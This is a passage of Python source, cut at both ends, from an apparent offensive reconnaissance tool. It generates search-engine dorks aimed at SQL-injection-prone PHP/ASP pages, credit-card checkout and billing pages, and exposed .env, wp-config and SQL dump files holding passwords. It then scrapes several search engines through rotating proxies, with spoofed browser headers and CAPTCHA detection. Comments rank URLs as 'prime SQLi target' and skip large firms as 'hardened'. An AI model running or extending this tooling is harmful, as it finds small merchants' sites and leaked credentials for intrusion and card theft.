            'intext:"SQLSTATE[" inurl:.php?{param}=',
            'intext:"Microsoft OLE DB Provider for SQL Server" inurl:.asp',
            'intext:"ORA-01756:" inurl:.php',
            'intext:"Incorrect syntax near" inurl:.asp?{param}=',
        ]
        for pat in error_dorks:
            for _ in range(5):
                param = next(param_cycle)
                results.add(pat.replace("{param}", param))

    # ── Payment / CC dorks ────────────────────────────────────────────────
    if include_payment_dorks:
        payment_dorks = [
            'inurl:checkout.php intext:"credit card" ext:php',
            'inurl:payment.php intext:"card number" ext:php',
            'inurl:billing.php intext:"card number" ext:php',
            'intext:"cvv" intext:"card number" inurl:.php?id=',
            'intext:"credit card" intext:"expiry" inurl:.php?{param}=',
            'intext:"visa" intext:"mastercard" inurl:checkout.php',
            'intext:"stripe" inurl:checkout.php ext:php',
            'intext:"paypal" intext:"card" inurl:checkout.php',
            'inurl:order.php intext:"payment" intext:"card" ext:php',
            'intext:"3d secure" inurl:checkout.php ext:php',
            '"{kw}" inurl:checkout.php?id=',
            '"{kw}" inurl:payment.php?id=',
        ]
        for kw in kw_pool[:20]:
            for pat in payment_dorks:
                param = next(param_cycle)
                results.add(pat.replace("{kw}", kw).replace("{param}", param))

    # ── CMS dorks ────────────────────────────────────────────────────────
    if include_cms_dorks:
        for cms_name in target_cms:
            if cms_name in CMS_DORKS:
                for kw in kw_pool[:10]:
                    for pat in CMS_DORKS[cms_name]:
                        param = next(param_cycle)
                        results.add(
                            pat.replace("{kw}", kw).replace("{param}", param)
                        )

    # ── Country-targeted dorks ────────────────────────────────────────────
    if include_country_dorks:
        for country_site in target_countries:
            for kw in kw_pool[:10]:
                results.add(f'"{kw}" inurl:.php?id= {country_site}')
                results.add(f'"{kw}" inurl:.php?{random.choice(params)}= {country_site}')
                results.add(f'"{kw}" ext:php inurl:?id= {country_site}')
                results.add(f'inurl:.php?id= {country_site} "{kw}"')

    dork_list = list(results)[:limit]
    random.shuffle(dork_list)
    return dork_list


# ══════════════════════════════════════════════════════════════════════════════
#  COUNTRY-TARGETED DORK GENERATOR
# ══════════════════════════════════════════════════════════════════════════════

def generate_country_dorks(
    keywords: list,
    countries: list = None,
    limit: int      = 5_000,
) -> list:
    """Gᴇɴᴇʀᴀᴛᴇ country-TLD-targeted SQLi dorks."""
    if countries is None:
        countries = COUNTRY_SITES[:20]
    results = set()
    params  = PHP_PARAMS[:20]
    random.shuffle(params)

    param_cycle = itertools.cycle(params)
    for country in countries:
        for kw in keywords[:50]:
            results.add(f'"{kw}" inurl:.php?id= {country}')
            p = next(param_cycle)
            results.add(f'"{kw}" inurl:.php?{p}= {country}')
            results.add(f'"{kw}" ext:php inurl:?id= {country}')
            results.add(f'ext:php inurl:?{p}= "{kw}" {country}')
            results.add(f'"{kw}" inurl:index.php?id= {country}')
            results.add(f'"{kw}" inurl:view.php?id= {country}')
            results.add(f'"{kw}" inurl:page.php?id= {country}')

    dork_list = list(results)[:limit]
    random.shuffle(dork_list)
    return dork_list


# ══════════════════════════════════════════════════════════════════════════════
#  CMS-TARGETED DORK GENERATOR
# ══════════════════════════════════════════════════════════════════════════════

def generate_cms_dorks(
    keywords: list,
    cms_list: list = None,
    limit: int     = 5_000,
) -> list:
    """Gᴇɴᴇʀᴀᴛᴇ CMS-specific SQLi dorks."""
    if cms_list is None:
        cms_list = list(CMS_DORKS.keys())
    results = set()
    params  = PHP_PARAMS[:20]
    param_cycle = itertools.cycle(params)

    for cms_name in cms_list:
        if cms_name not in CMS_DORKS:
            continue
        for kw in keywords[:30]:
            for pat in CMS_DORKS[cms_name]:
                p = next(param_cycle)
                results.add(
                    pat.replace("{kw}", kw).replace("{param}", p)
                )

    dork_list = list(results)[:limit]
    random.shuffle(dork_list)
    return dork_list


# ══════════════════════════════════════════════════════════════════════════════
#  EXPOSED FILE DORK GENERATOR  (OG DorkLab — Exposed Files category)
# ══════════════════════════════════════════════════════════════════════════════

def generate_exposed_dorks(keywords: list, limit: int = 2_000) -> list:
    """Gᴇɴᴇʀᴀᴛᴇ exposed file / sensitive config dorks."""
    results = set()
    exposed = [
        'filetype:sql intext:"INSERT INTO" "{kw}"',
        'filetype:env intext:"DB_PASSWORD" "{kw}"',
        'filetype:yml intext:"password" "{kw}"',
        'filetype:xml intext:"password" "{kw}"',
        'filetype:ini intext:"passwd" "{kw}"',
        'filetype:log intext:"password" "{kw}"',
        'filetype:conf intext:"password" "{kw}"',
        'filetype:bak inurl:backup "{kw}"',
        'filetype:json intext:"api_key" "{kw}"',
        'filetype:txt intext:"password" "{kw}"',
        'inurl:"/.env" intext:"DB_PASSWORD"',
        'inurl:"/config.php" intext:"$db_pass"',
        'inurl:"/wp-config.php" intext:"DB_PASSWORD"',
        'inurl:"/phpMyAdmin" intitle:"phpMyAdmin"',
        'intitle:"Index of" intext:".sql" "{kw}"',
        'intitle:"Index of" intext:"backup" "{kw}"',
        'intitle:"Index of" intext:"config" intext:".php"',
        'inurl:"db.php" intext:"mysql_connect"',
    ]
    for kw in keywords[:50]:
        for pat in exposed:
            results.add(pat.replace("{kw}", kw))
    dork_list = list(results)[:limit]
    random.shuffle(dork_list)
    return dork_list


# ══════════════════════════════════════════════════════════════════════
#   URL FINDER
# ══════════════════════════════════════════════════════════════════════

_THREAD_POOL = concurrent.futures.ThreadPoolExecutor(max_workers=512)

# ── GLOBAL SHARED TCP CONNECTOR ───────────────────────────────────────────────
# One connector shared by ALL users — reuses TCP connections instead of
# opening a fresh socket for every single search request.
# With 1000 users this saves thousands of connection handshakes per minute.
_GLOBAL_CONNECTOR: aiohttp.TCPConnector | None = None

def _get_connector() -> aiohttp.TCPConnector:
    global _GLOBAL_CONNECTOR
    if _GLOBAL_CONNECTOR is None or _GLOBAL_CONNECTOR.closed:
        _GLOBAL_CONNECTOR = aiohttp.TCPConnector(
            limit=4000,          # total concurrent connections
            limit_per_host=250,   # per-host cap
            ttl_dns_cache=600,   # cache DNS 5 mins
            force_close=False,   # reuse keep-alive sockets
            enable_cleanup_closed=True,
        )
    return _GLOBAL_CONNECTOR

# ── DDGS CIRCUIT BREAKER ───────────────────────────────────────────────────────
# Tracks consecutive empty/failed DDGS calls across threads.
# When it hits 10, all threads sleep 45s then reset — avoids spending hours
# hammering a rate-limited API at 500k dork scale.
_ddgs_lock             = _threading.Lock()
_ddgs_consecutive_fail = 0
_ddgs_disabled_until   = 0.0

def _ddgs_is_available() -> bool:
    if not DDGS_AVAILABLE:
        return False
    return time.time() >= _ddgs_disabled_until

def _ddgs_record_empty():
    global _ddgs_consecutive_fail, _ddgs_disabled_until
    with _ddgs_lock:
        _ddgs_consecutive_fail += 1
        if _ddgs_consecutive_fail >= 5:
            _ddgs_disabled_until   = time.time() + 60.0
            _ddgs_consecutive_fail = 0

def _ddgs_record_success():
    global _ddgs_consecutive_fail
    with _ddgs_lock:
        _ddgs_consecutive_fail = 0

def _ddgs_wait_if_coolingdown():
    """Non-blocking: never freeze worker threads."""
    pass

# ── HEADERS ───────────────────────────────────────────────────────────────────
HEADERS_LIST = [
    {
        "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 "
                      "(KHTML, like Gecko) Chrome/124.0.0.0 Safari/537.36",
        "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8",
        "Accept-Language": "en-US,en;q=0.9",
        "Accept-Encoding": "gzip, deflate",
        "Connection": "keep-alive",
        "Cache-Control": "no-cache",
    },
    {
        "User-Agent": "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 "
                      "(KHTML, like Gecko) Chrome/123.0.0.0 Safari/537.36",
        "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8",
        "Accept-Language": "en-GB,en;q=0.9",
        "Accept-Encoding": "gzip, deflate",
        "Connection": "keep-alive",
    },
    {
        "User-Agent": "Mozilla/5.0 (X11; Linux x86_64; rv:125.0) Gecko/20100101 Firefox/125.0",
        "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8",
        "Accept-Language": "en-US,en;q=0.5",
        "Accept-Encoding": "gzip, deflate",
        "Connection": "keep-alive",
    },
    {
        "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:124.0) Gecko/20100101 Firefox/124.0",
        "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8",
        "Accept-Language": "de-DE,de;q=0.9,en;q=0.5",
        "Accept-Encoding": "gzip, deflate",
        "Connection": "keep-alive",
    },
    {
        "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 "
                      "(KHTML, like Gecko) Chrome/122.0.0.0 Safari/537.36 Edg/122.0.0.0",
        "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8",
        "Accept-Language": "en-US,en;q=0.9",
        "Accept-Encoding": "gzip, deflate",
        "Connection": "keep-alive",
    },
    {
        "User-Agent": "Mozilla/5.0 (iPhone; CPU iPhone OS 17_4 like Mac OS X) "
                      "AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.4 Mobile/15E148 Safari/604.1",
        "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8",
        "Accept-Language": "en-US,en;q=0.9",
        "Accept-Encoding": "gzip, deflate",
        "Connection": "keep-alive",
    },
]

# ── BLACKLIST — search engines, social media, mega-corps (never SQLi targets) ─
BLACKLIST_DOMAINS = {
    # Search engines
    "google.com", "google.co.uk", "google.co.in", "googleapis.com",
    "googleusercontent.com", "gstatic.com", "googlesyndication.com",
    "bing.com", "msn.com",
    "yahoo.com", "yimg.com", "yahooapis.com",
    "duckduckgo.com", "ddg.gg",
    "ask.com", "baidu.com", "yandex.com", "yandex.ru",
    "startpage.com", "searxng.org", "mojeek.com",
    # Social media / messaging
    "facebook.com", "fb.com", "fbcdn.net", "instagram.com",
    "twitter.com", "x.com", "t.co",
    "tiktok.com", "snapchat.com",
    "linkedin.com", "pinterest.com",
    "telegram.org", "telegram.me", "whatsapp.com",
    "discord.com", "discord.gg",
    "twitch.tv", "reddit.com", "redd.it",
    "quora.com", "zhihu.com",
    # Video
    "youtube.com", "youtu.be", "ytimg.com", "vimeo.com",
    # Ad networks / tracking
    "doubleclick.net", "adnxs.com", "ad.com",
    "googletagmanager.com", "googletag.com",
    "scorecardresearch.com", "quantserve.com",
    "outbrain.com", "taboola.com",
    # CDN / infra (no real content)
    "cloudflare.com", "fastly.net",
    "cdn.jsdelivr.net", "cdnjs.cloudflare.com",
    "unpkg.com", "jsdelivr.net",
    # Shorteners
    "bit.ly", "tinyurl.com", "goo.gl", "ow.ly", "t.ly", "rb.gy",
    # Misc junk
    "archive.org", "web.archive.org", "gravatar.com",
    # ── MEGA CORPORATIONS — hardened security, never SQLi targets ─────────────
    # Microsoft ecosystem
    "microsoft.com", "office.com", "office365.com", "live.com",
    "outlook.com", "hotmail.com", "microsoftonline.com",
    "azure.com", "azurewebsites.net", "windowsazure.com",
    "sharepoint.com", "onedrive.com", "skype.com",
    "techcommunity.microsoft.com",
    # Google ecosystem
    "gmail.com", "drive.google.com", "docs.google.com",
    "maps.google.com", "play.google.com",
    # Amazon ecosystem
    "amazon.com", "amazon.co.uk", "amazon.in", "amazon.de",
    "amazonaws.com", "aws.amazon.com", "awsstatic.com",
    # Apple
    "apple.com", "icloud.com", "itunes.apple.com", "apps.apple.com",
    # Major e-commerce
    "ebay.com", "etsy.com", "aliexpress.com", "alibaba.com",
    "walmart.com", "target.com", "bestbuy.com", "costco.com",
    "shopify.com", "bigcommerce.com",
    # Travel / booking mega sites
    "booking.com", "expedia.com", "airbnb.com", "tripadvisor.com",
    "hotels.com", "kayak.com", "trivago.com", "priceline.com",
    "agoda.com", "vrbo.com",
    # Finance / banking (hardened)
    "paypal.com", "stripe.com", "square.com",
    "bankofamerica.com", "chase.com", "wellsfargo.com", "citibank.com",
    "americanexpress.com", "capitalone.com", "discover.com",
    "usbank.com", "tdbank.com", "truist.com",
    "creditkarma.com", "nerdwallet.com", "mint.com",
    "experian.com", "equifax.com", "transunion.com",
    "intuit.com", "turbotax.intuit.com",
    # Government (never SQLi)
    "irs.gov", "usa.gov", "gov.uk", "data.gov",
    "studentaid.gov", "ed.gov", "ohio.gov",
    # Entertainment / media giants
    "netflix.com", "hulu.com", "disneyplus.com", "hbomax.com",
    "spotify.com", "soundcloud.com",
    "poki.com", "roblox.com", "steam.com", "steampowered.com",
    "epicgames.com", "ea.com",
    # News / content giants
    "bbc.com", "bbc.co.uk", "cnn.com", "nytimes.com",
    "theguardian.com", "reuters.com", "apnews.com",
    "forbes.com", "businessinsider.com", "techcrunch.com",
    # Dev / tech giants
    "github.com", "gitlab.com", "stackoverflow.com",
    "stackexchange.com", "medium.com", "dev.to",
    "npm.js.org", "pypi.org", "docs.python.org",
    # Productivity SaaS
    "notion.so", "airtable.com", "slack.com", "zoom.us",
    "grammarly.com", "canva.com", "figma.com",
    "dropbox.com", "box.com",
    # Real estate / classifieds
    "zillow.com", "realtor.com", "redfin.com",
    "apartments.com", "apartmenthomeliving.com", "trulia.com",
    "craigslist.org",
    # Misc big brands
    "yelp.com", "angi.com", "homedepot.com", "lowes.com",
    "staples.com", "officedepot.com",
    "adobe.com", "salesforce.com", "hubspot.com", "zendesk.com",
    "xe.com", "transferwise.com", "wise.com",
    "kiplinger.com", "thecollegeinvestor.com", "wallethub.com",
    "merriam-webster.com", "dictionary.com", "cambridge.org",
    "scheels.com", "dickssportinggoods.com", "rei.com",
}

# ── JUNK PATH PATTERNS — skip these file types ───────────────────────────────
JUNK_EXT = re.compile(
    r"\.(css|js|png|jpg|jpeg|gif|ico|svg|webp|woff|woff2|ttf|eot"
    r"|xml|json|zip|exe|dmg|apk|pdf|doc|docx|xls|xlsx|csv|mp4|mp3"
    r"|avi|mov|mkv|flv|swf|iso|tar|gz|rar|7z)(\?|$)",
    re.IGNORECASE,
)

JUNK_URL_PATTERNS = re.compile(
    r"(doubleclick|adservice|pagead|adsense|googletagmanager"
    r"|/redir\?|/redirect\?|/click\?|/trk\?|/track\?|/affiliate/"
    r"|/aff/|/banner/|/pixel/|/beacon/|/ads/|ad\.php|/ad/\d)",
    re.IGNORECASE,
)

# ── HIGH-VALUE PATH (raises quality score) ────────────────────────────────────
HIGH_VALUE = re.compile(
    r"(payment|checkout|billing|invoice|transaction|receipt|order|cart"
    r"|subscribe|subscription|membership|upgrade|refund|gateway"
    r"|paypal|stripe|razorpay|authorize|braintree"
    r"|login|signin|account|dashboard|profile|admin|member"
    r"|creditcard|credit.card|debit|cardinfo"
    r"|buy|purchase|shop|plan|register|signup)",
    re.IGNORECASE,
)


# ── DORK CLEANER ──────────────────────────────────────────────────────────────

def clean_dork_for_search(dork: str) -> str:
    """
    Convert complex dork syntax (Google-style operators, pipes, tildes, etc.)
    into a clean query that DuckDuckGo and Bing understand.
    Preserves: inurl: ext: site:full-domain.com "quoted phrases"
    Strips:    site:.in site:pk site:.br — country TLD operators
               (DDGS returns 0 results for TLD-only site: operators)
    """
    d = dork
    # Remove backslash escapes
    d = d.replace("\\", " ")
    # ── Strip country-TLD site: operators — DDGS can't handle them ────────────
    # Matches: site:.in  site:pk  site:.br  etc. (2-letter TLDs only, no dots inside)
    # Does NOT remove: site:example.com  site:wordpress.com
    d = re.sub(r'\bsite:\.?[a-zA-Z]{2}\b(?![\w.])', ' ', d)
    # Remove pipe-based logic operators
    d = re.sub(r"\|\.\s*>", " ", d)         # |. >
    d = re.sub(r"\d\s*\|\s*\d\s*\|\s*\d", " ", d)  # 1|3|4
    d = d.replace("|", " ")
    # Remove tilde proximity
    d = d.replace("~", "")
    # Remove -intext: (not supported in DDG)
    d = re.sub(r"-intext:\S+", "", d)
    # Remove & operator
    d = d.replace(" & ", " ")
    # Fix *login ➪ login
    d = re.sub(r"\*(\w+)", r"\1", d)
    # Remove trailing "or word"
    d = re.sub(r"\bor\s+\w+\s*$", "", d, flags=re.IGNORECASE)
    # Collapse spaces
    d = re.sub(r"\s+", " ", d).strip()
    return d


# ── URL UTILITIES ─────────────────────────────────────────────────────────────

def decode_bing_redirect(href: str) -> str:
    """Decode Bing's base64-encoded redirect URLs to get the real target."""
    try:
        if "bing.com/ck/a" in href or "/ck/a?" in href:
            full = href if href.startswith("http") else "https://www.bing.com" + href
            parsed = urlparse(full)
            params = parse_qs(parsed.query)
            if "u" in params:
                u_val = params["u"][0]
                if u_val.startswith("a1"):
                    u_val = u_val[2:]
                rem = len(u_val) % 4
                if rem:
                    u_val += "=" * (4 - rem)
                decoded = base64.b64decode(u_val).decode("utf-8", errors="ignore")
                if decoded.startswith("http"):
                    return decoded
    except Exception:
        pass
    return href


# Tracking/noise query params to strip before deduplication
_STRIP_PARAMS = frozenset([
    # UTM / universal analytics
    "utm_source", "utm_medium", "utm_campaign", "utm_content", "utm_term",
    "utm_id", "utm_source_platform", "utm_creative_format", "utm_marketing_tactic",
    # Click IDs (ad networks)
    "fbclid", "gclid", "msclkid", "twclid", "ttclid", "li_fat_id", "wbraid",
    "gbraid", "dclid", "yclid", "zanpid", "clickid", "click_id",
    # Microsoft / Bing tracking — msockid is added by Bing to EVERY result URL
    "msockid", "wa", "whr", "JitExp", "mkt", "WT.mc_id", "WT.srch",
    # HubSpot
    "__hssc", "__hstc", "__hsrc", "hsctaTracking", "hsa_acc", "hsa_cam",
    "hsa_grp", "hsa_ad", "hsa_src", "hsa_tgt", "hsa_kw", "hsa_mt",
    "hsa_net", "hsa_ver",
    # Mailchimp / email
    "mc_cid", "mc_eid", "vero_id", "mkt_tok",
    # Generic tracking
    "ref", "referrer", "referer", "source", "share", "sid", "cid",
    "affiliate", "partner", "origin", "campaign", "adid", "ad_id",
    "placement", "network", "device", "keyword", "matchtype",
    # Analytics
    "_ga", "_gid", "_gl", "_gac", "ga_source",
    # Misc session noise (not content)
    "execution", "feedViewType", "noredirect", "RTN", "msclkid",
    "icid", "linkId", "adobe_mc", "s_kwcid", "ef_id",
])


def normalize_url(url: str) -> str:
    """
    Normalize a URL for strict deduplication:
    - Lowercase scheme + host
    - Strip trailing slash
    - Remove tracking/noise query params
    - Sort remaining query params for order-independent matching
    """
    try:
        url = url.rstrip("/").strip()
        parsed = urlparse(url)
        netloc = parsed.netloc.lower()
        path = parsed.path

        # Strip tracking params, sort the rest
        if parsed.query:
            clean = [(k, v) for k, v in parse_qsl(parsed.query, keep_blank_values=True)
                     if k.lower() not in _STRIP_PARAMS]
            query = urlencode(sorted(clean)) if clean else ""
        else:
            query = ""

        norm = f"{parsed.scheme.lower()}://{netloc}{path}"
        if query:
            norm += "?" + query
        return norm
    except Exception:
        return url


def is_valid_url(url: str) -> bool:
    """
    Accept any real HTTP/HTTPS URL that:
    - Is not from a blacklisted domain (search engines, social media, ad nets)
    - Has a real path (not just the homepage /)
    - Is not a static asset (.css, .js, .png, etc.)
    - Is not an ad/tracking redirect
    
    NOTE: Query params NOT required — search engines return real pages
    even without visible params. We accept all of them for maximum coverage.
    High-value URLs (with PHP params, login paths etc.) are scored higher.
    """
    try:
        parsed = urlparse(url)

        # Must be http or https
        if parsed.scheme not in ("http", "https"):
            return False

        # Extract clean domain
        netloc = parsed.netloc.lower()
        domain = netloc.split(":")[0]
        if domain.startswith("www."):
            domain = domain[4:]

        # Basic domain sanity
        if not domain or "." not in domain or len(domain) < 4:
            return False

        # Blacklist check (exact + subdomain match)
        for bl in BLACKLIST_DOMAINS:
            if domain == bl or domain.endswith("." + bl):
                return False

        # Must have a real path
        path = parsed.path
        if not path or path in ("/", ""):
            return False

        # No static asset extensions
        if JUNK_EXT.search(path):
            return False

        # No ad/tracking patterns
        if JUNK_URL_PATTERNS.search(url):
            return False

        return True
    except Exception:
        return False


def url_quality_score(url: str) -> int:
    """
    Score URLs 0-10+.
    Higher score = shown first in results.
    PHP/ASPX pages with query params score highest (prime dork targets).
    """
    score = 0
    try:
        parsed = urlparse(url.lower())
        path = parsed.path
        query = parsed.query

        # Has query parameters (dynamic page — exactly what dorks target)
        if query:
            score += 3
            param_count = len(parse_qs(query))
            score += min(param_count, 3)

        # PHP / ASPX / ASP dynamic pages
        if ".php" in path:
            score += 3
            if query:
                score += 3  # PHP + params = prime SQLi target (bonus stacks)
        elif ".aspx" in path or ".asp" in path:
            score += 2
            if query:
                score += 2
        elif ".cfm" in path or ".jsp" in path:
            score += 1
            if query:
                score += 1

        # High-value path keywords
        if HIGH_VALUE.search(path):
            score += 4

        # HTTPS is slightly better
        if parsed.scheme == "https":
            score += 1

    except Exception:
        pass
    return score


# ── DDGS PRIMARY ENGINE ───────────────────────────────────────────────────────

try:
    from aiohttp_socks import ProxyConnector as _ProxyConnector
    _SOCKS_AVAILABLE = True
except ImportError:
    _SOCKS_AVAILABLE = False


def _parse_proxy(proxy_str: str) -> str:
    """
    Convert proxy string to a usable proxy URL.
    Accepts:
      host:port             ➪  socks5://host:port   (bare host:port = SOCKS5)
      host:port:user:pass   ➪  http://user:pass@host:port
      socks5://host:port    ➪  unchanged
      http://...            ➪  unchanged
    """
    if not proxy_str:
        return ""
    proxy_str = proxy_str.strip().rstrip("\r")
    if proxy_str.startswith(("http://", "https://", "socks5://", "socks4://")):
        return proxy_str
    parts = proxy_str.split(":")
    if len(parts) == 4:
        host, port, user, pwd = parts
        return f"http://{user}:{pwd}@{host}:{port}"
    elif len(parts) == 2:
        # Plain host:port — treat as SOCKS5 (most common format in proxy files)
        return f"socks5://{proxy_str}"
    return f"socks5://{proxy_str}"


async def check_proxy_live(proxy_url: str, timeout: float = 8.0) -> bool:
    """
    Test whether a proxy is reachable.
    Supports HTTP, HTTPS, SOCKS4, SOCKS5 proxies.
    Returns True if live, False if dead/unreachable.
    """
    if not proxy_url:
        return False

    is_socks = proxy_url.startswith(("socks5://", "socks4://"))

    try:
        if is_socks and _SOCKS_AVAILABLE:
            connector = _ProxyConnector.from_url(proxy_url, ssl=False)
        else:
            connector = aiohttp.TCPConnector(ssl=False)

        async with aiohttp.ClientSession(connector=connector) as session:
            kwargs = dict(
                timeout=aiohttp.ClientTimeout(total=timeout),
                allow_redirects=False,
            )
            if not is_socks:
                kwargs["proxy"] = proxy_url
            async with session.get("https://api.ipify.org", **kwargs) as resp:
                return resp.status in (200, 301, 302)
    except Exception:
        return False


async def check_proxies_bulk(
    proxy_list: list,
    timeout: float = 6.0,
    concurrency: int = 300,
    progress_callback=None,
) -> list:
    """
    Check a large list of proxy URLs concurrently.
    Returns list of live proxy URLs.
    progress_callback(checked, total, live_count) called every ~2 seconds.
    """
    total = len(proxy_list)
    live = []
    checked = 0
    last_report = 0.0
    sem = asyncio.Semaphore(concurrency)

    async def _check(px: str):
        nonlocal checked, last_report, live
        async with sem:
            result = await check_proxy_live(px, timeout=timeout)
            checked += 1
            if result:
                live.append(px)
            now = asyncio.get_event_loop().time()
            if progress_callback and (now - last_report) >= 2.0:
                last_report = now
                try:
                    await progress_callback(checked, total, len(live))
                except Exception:
                    pass

    await asyncio.gather(*[_check(px) for px in proxy_list], return_exceptions=True)

    # Final progress report
    if progress_callback:
        try:
            await progress_callback(checked, total, len(live))
        except Exception:
            pass

    return live


def _pick_proxy(proxy_list: list) -> str:
    """Pick a random proxy from the pool, or empty string if pool is empty."""
    if not proxy_list:
        return ""
    return random.choice(proxy_list)


_CAPTCHA_PHRASES = (
    "captcha", "unusual traffic", "access denied",
    "robot check", "verify you are human", "enable javascript",
    "checking your browser", "just a moment", "ddos protection",
    "please wait", "security check", "bot traffic",
)

def _is_captcha_page(html: str) -> bool:
    """Return True if the HTML looks like a CAPTCHA / block page."""
    sample = html[:3000].lower()
    return any(p in sample for p in _CAPTCHA_PHRASES)


def _ddgs_search_sync(dork: str, max_results: int, proxy_list: list = None) -> list:
    """Fast single-pass DDGS search — no thread-blocking sleeps."""
    if not _ddgs_is_available():
        return []
    cleaned = clean_dork_for_search(dork)
    if not cleaned:
        return []

    proxy_url = _pick_proxy(proxy_list)
    try:
        if proxy_url:
            try:
                ddgs_obj = DDGS(proxy=proxy_url)
            except TypeError:
                try:
                    ddgs_obj = DDGS(proxies=proxy_url)
                except Exception:
                    ddgs_obj = DDGS()
        else:
            ddgs_obj = DDGS()
        results = ddgs_obj.text(cleaned, max_results=max_results, safesearch="off")
        urls = []
        for r in (results or []):
            href = r.get("href", "")
            if href and href.startswith("http") and is_valid_url(href):
                urls.append(href.rstrip("/"))
        if urls:
            _ddgs_record_success()
            return urls
        _ddgs_record_empty()
        return []
    except Exception:
        _ddgs_record_empty()
        return []


def _ddgs_expand_dork(dork: str, num_variants: int = 3) -> list:
    """
    Gᴇɴᴇʀᴀᴛᴇ query variants per dork for more URL coverage.
    num_variants scales down at high dork counts to avoid DDGS death:
      ≤ 500 dorks  ➪ 3 variants (base + .com + .org)
      ≤ 5000       ➪ 2 variants (base + .com)
      > 5000       ➪ 1 variant  (base only — 500k dorks need max throughput)
    """
    base = dork.strip()
    # Only skip variants if there's a REAL domain site: (not country TLD like site:.in)
    # Country TLDs are stripped by clean_dork_for_search so they don't block variants
    has_real_site = bool(re.search(r'site:[a-zA-Z0-9].*\.[a-zA-Z]{2,}\.', base)
                         or re.search(r'site:[a-zA-Z0-9][a-zA-Z0-9.-]{3,}', base))
    if num_variants <= 1 or has_real_site:
        return [base]
    variants = [base]
    variants.append(base + " site:.com")
    if num_variants >= 3:
        variants.append(base + " site:.org")
    return variants


async def search_ddgs_batch(dorks: list, max_results: int = 12, proxy_list: list = None,
                            num_variants: int = 3) -> list:
    """
    Run multiple DDGS searches concurrently using the shared thread pool.
    num_variants controls how many query variants per dork (auto-scaled by caller).
    Sub-batched in groups of 20 (not 100) to avoid rate-limit bursts.
    """
    if proxy_list is None:
        proxy_list = []
    if not DDGS_AVAILABLE:
        return []

    # Expand dorks to variants (scales with num_variants for large dork sets)
    expanded = []
    for d in dorks:
        expanded.extend(_ddgs_expand_dork(d, num_variants=num_variants))

    loop = asyncio.get_running_loop()
    all_urls = []

    # Sub-batch of 20 to avoid rate-limit storm
    SUB_BATCH = 60
    for i in range(0, len(expanded), SUB_BATCH):
        sub = expanded[i: i + SUB_BATCH]
        futures = [
            loop.run_in_executor(_THREAD_POOL, _ddgs_search_sync, dork, max_results, proxy_list)
            for dork in sub
        ]
        results = await asyncio.gather(*futures, return_exceptions=True)
        for result in results:
            if isinstance(result, list):
                all_urls.extend(result)
        # Brief pause between sub-batches to avoid DDGS rate-limit
        if i + SUB_BATCH < len(expanded):
            await asyncio.sleep(0.02)

    return all_urls


# ── HTML SCRAPERS (Bing + DDG) ────────────────────────────────────────────────

def _fix_href(href: str, skip_domain: str = "") -> str:
    if not href:
        return ""
    # Decode Bing redirect
    if "bing.com/ck/a" in href or "/ck/a?" in href:
        href = decode_bing_redirect(href)
    # Decode DDG redirect (?uddg=)
    if "uddg=" in href:
        try:
            href = unquote(href.split("uddg=")[1].split("&")[0])
        except Exception:
            pass
    # Decode Yahoo redirect (/RU=)
    if "/RU=" in href:
        try:
            href = unquote(href.split("/RU=")[1].split("/RK=")[0])
        except Exception:
            pass
    # Reject if still pointing to skip_domain
    if skip_domain and skip_domain in href.lower():
        return ""
    return href


def extract_bing_urls(html: str) -> list:
    urls = []
    try:
        soup = BeautifulSoup(html, "lxml")
        # Primary: result list items
        for li in soup.find_all("li", class_="b_algo"):
            for a in li.find_all("a", href=True):
                href = _fix_href(a["href"].strip(), "bing.com")
                if href.startswith("http") and is_valid_url(href):
                    urls.append(href.rstrip("/"))
        # Secondary: h2 headings (also result links)
        for h2 in soup.find_all("h2"):
            a = h2.find("a", href=True)
            if a:
                href = _fix_href(a["href"].strip(), "bing.com")
                if href.startswith("http") and is_valid_url(href):
                    urls.append(href.rstrip("/"))
        # Fallback: all links on page
        if not urls:
            for a in soup.find_all("a", href=True):
                href = _fix_href(a["href"].strip(), "bing.com")
                if href.startswith("http") and is_valid_url(href):
                    urls.append(href.rstrip("/"))
    except Exception:
        pass
    return list(dict.fromkeys(urls))  # dedupe while preserving order


def extract_ddg_urls(html: str) -> list:
    urls = []
    try:
        soup = BeautifulSoup(html, "lxml")
        for a in soup.find_all("a", href=True):
            href = _fix_href(a["href"].strip(), "duckduckgo.com")
            if href.startswith("http") and is_valid_url(href):
                urls.append(href.rstrip("/"))
    except Exception:
        pass
    return list(dict.fromkeys(urls))


def extract_yandex_urls(html: str) -> list:
    """Extract URLs from Yandex search results HTML."""
    urls = []
    try:
        soup = BeautifulSoup(html, "lxml")
        # Yandex result links: data-url attribute on serp-item__title-link
        for a in soup.find_all("a", {"class": lambda c: c and "organic__url" in c}):
            href = _fix_href(a.get("href", "").strip(), "yandex.com")
            if href.startswith("http") and is_valid_url(href):
                urls.append(href.rstrip("/"))
        # Fallback: data-url attributes
        for tag in soup.find_all(attrs={"data-url": True}):
            href = _fix_href(tag["data-url"].strip(), "yandex.com")
            if href.startswith("http") and is_valid_url(href):
                urls.append(href.rstrip("/"))
        # Second fallback: all links
        if not urls:
            for a in soup.find_all("a", href=True):
                href = _fix_href(a["href"].strip(), "yandex.com")
                if href.startswith("http") and is_valid_url(href):
                    urls.append(href.rstrip("/"))
    except Exception:
        pass
    return list(dict.fromkeys(urls))


def extract_ask_urls(html: str) -> list:
    """Extract URLs from Ask.com search results HTML."""
    urls = []
    try:
        soup = BeautifulSoup(html, "lxml")
        for a in soup.find_all("a", href=True):
            href = _fix_href(a["href"].strip(), "ask.com")
            if href.startswith("http") and is_valid_url(href):
                urls.append(href.rstrip("/"))
    except Exception:
        pass
    return list(dict.fromkeys(urls))


def extract_google_urls(html: str) -> list:
    """Extract URLs from Google search results HTML."""
    urls = []
    try:
        soup = BeautifulSoup(html, "lxml")
